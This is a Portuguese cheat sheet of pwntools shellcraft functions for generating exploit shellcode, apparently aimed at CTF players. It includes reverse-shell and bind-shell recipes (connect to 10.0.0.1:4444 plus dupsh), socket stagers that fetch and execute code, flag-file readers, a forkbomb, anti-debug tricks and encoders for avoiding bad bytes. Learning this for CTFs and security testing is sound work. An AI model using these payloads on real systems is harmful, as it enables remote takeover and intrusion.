O `shellcraft` é o módulo do pwntools que gera shellcode em assembly. Tudo o que ele retorna é **texto em assembly**: use `asm()` para transformar em bytes.

```py
from pwn import *
context.arch = 'amd64'          # ou 'i386', 'arm', 'aarch64', ...

sc = asm(shellcraft.sh())       # bytes prontos para enviar
print(shellcraft.sh())          # mostra o assembly gerado
```

Quando `context.arch` está definido, `shellcraft.sh()` é um atalho para `shellcraft.amd64.linux.sh()` (ou o equivalente da arquitetura). A lista completa de cada arquitetura está na [documentação oficial](https://docs.pwntools.com/en/stable/shellcraft.html). Abaixo estão as funções que existem para `amd64.linux` (a maioria também existe em `i386.linux`).

Dica: no terminal, `shellcraft -l amd64` lista tudo, `shellcraft amd64.linux.sh` imprime o assembly e `shellcraft -f hex amd64.linux.sh` imprime os bytes.

## Shell

```py
shellcraft.sh()                    # execve("/bin///sh", ["sh"], NULL)
shellcraft.dupsh(sock='rbp')       # dup2 do socket para stdin/stdout/stderr e depois execve de /bin/sh
shellcraft.findpeersh(port=None)   # Acha o socket conectado à porta e abre um shell nele
shellcraft.bindsh(port, network='ipv4')   # Escuta na porta e abre shell para quem conectar
```

Para um reverse shell, combine `connect` com `dupsh`:

```py
sc  = shellcraft.connect('10.0.0.1', 4444)   # socket conectado fica em rbp
sc += shellcraft.dupsh('rbp')
```

## Rede

```py
shellcraft.connect(host, port, network='ipv4')  # Conecta e deixa o socket em rbp
shellcraft.listen(port, network='ipv4')         # Escuta, aceita um cliente e deixa o socket em rax
shellcraft.findpeer(port=None)                  # Acha o fd do socket conectado à porta
shellcraft.socket(network='ipv4', proto='tcp')  # Só cria o socket
shellcraft.recvsize(sock, reg='rcx')            # Lê 4 bytes de tamanho do socket
shellcraft.stager(sock, size)                   # Lê `size` bytes do socket e executa (shellcode em 2 estágios)
shellcraft.connectstager(host, port)            # connect + stager
shellcraft.findpeerstager(port=None)            # findpeer + stager
```

## Arquivos e I/O

```py
shellcraft.cat(filename, fd=1)          # Abre o arquivo e escreve no fd com sendfile (ex: ler a flag)
shellcraft.cat2(filename, fd=1, length=0x4000)  # Igual, mas com read/write (quando sendfile não funciona)
shellcraft.readfile(path, dst='rdi')    # Abre o arquivo e envia o conteúdo para o fd em dst
shellcraft.echo(string, sock='1')       # Escreve uma string no fd
shellcraft.read(fd, buf, count)         # read()
shellcraft.readn(fd, buf, nbytes)       # Lê exatamente n bytes (em loop)
shellcraft.readloop(fd)                 # Lê e executa repetidamente
shellcraft.readptr(fd, reg)             # Lê um ponteiro para um registrador
shellcraft.dupio(sock='rbp')            # dup2 do socket para 0, 1 e 2 (sem abrir shell)
```

## Processos

```py
shellcraft.forkexit()                   # fork, e o pai sai
shellcraft.forkbomb()                   # Autoexplicativo (não use em CTF remoto, é DoS)
shellcraft.killparent()                 # kill no processo pai
shellcraft.sleep(seconds)
shellcraft.setreuid(uid=None), setregid(), setresuid()   # Trocar uid/gid (ex: binário setuid)
shellcraft.strace_dos()                 # Trava o strace (anti-debug)
```

## Memória e stack

```py
shellcraft.mmap_rwx(size=0x1000, ...)   # Mapeia memória rwx
shellcraft.migrate_stack(size=0x100000) # Move a stack para memória nova (mmap)
shellcraft.egghunter(egg)               # Procura a sequência `egg` na memória (endereço fica em rdi)
shellcraft.push(value)                  # push de um imediato (lida com bytes nulos)
shellcraft.pushstr('string')            # Empilha string terminada em \0
shellcraft.pushstr_array('rsi', ['sh', '-c', 'ls'])   # Empilha um array de strings (argv)
shellcraft.mov('rax', 59)               # mov que evita bytes nulos quando possível
shellcraft.setregs({'rax': 59, 'rdi': 'rsp', 'rsi': 0})   # Define vários registradores de uma vez
shellcraft.memcpy(dst, src, n), strcpy(dst, src), strlen(string), itoa(v)
shellcraft.xor(key, address, count)     # XOR em região de memória (decoder)
```

## Syscalls

Toda syscall do Linux existe como função, com o mesmo nome e os mesmos argumentos da man page. `shellcraft.syscall()` monta uma syscall qualquer.

```py
shellcraft.execve('/bin/sh', ['sh'], 0)
shellcraft.open('/flag', 0)             # fd volta em rax
shellcraft.read(fd, buf, count)
shellcraft.write(1, buf, count)
shellcraft.dup2(oldfd, newfd)
shellcraft.exit(status)
shellcraft.mprotect(addr, len, prot)
shellcraft.sigreturn()                  # rt_sigreturn (ver SIGROP)
shellcraft.syscall('SYS_execve', 'rdi', 0, 0)   # Genérica
shellcraft.syscalls.<nome>()            # Mesma coisa, pelo módulo syscalls
```

## Utilidades

```py
shellcraft.nop()                        # NOP da arquitetura (nem sempre é 0x90)
shellcraft.ret(return_value=None)       # ret (opcionalmente definindo rax)
shellcraft.trap()                       # int3 (breakpoint: útil para achar onde o shellcode começa no GDB)
shellcraft.crash()                      # Crasha de propósito
shellcraft.infloop()                    # jmp $ (loop infinito)
shellcraft.pushad() / shellcraft.popad()    # Salva/restaura todos os registradores (emulado em amd64)
shellcraft.amd64_to_i386()              # Troca para o modo 32 bits (shellcode "híbrido")
shellcraft.loader(address), loader_append(data)  # Carrega e executa um ELF a partir da memória
```

## Encoders

Encoders não ficam no `shellcraft`, mas em `pwnlib.encoders`. Servem para evitar bytes proibidos (`\x00`, `\n`, ...) ou para deixar o shellcode só com caracteres imprimíveis:

```py
from pwn import *
context.arch = 'amd64'
sc = asm(shellcraft.sh())

encode(sc, avoid=b'\x00\n')             # Evita bytes específicos
encoders.alphanumeric(sc)              # Só caracteres alfanuméricos (i386 e amd64)
```

Para testar qualquer shellcode localmente: `run_shellcode(sc).interactive()` ou `run_assembly(shellcraft.sh())`.
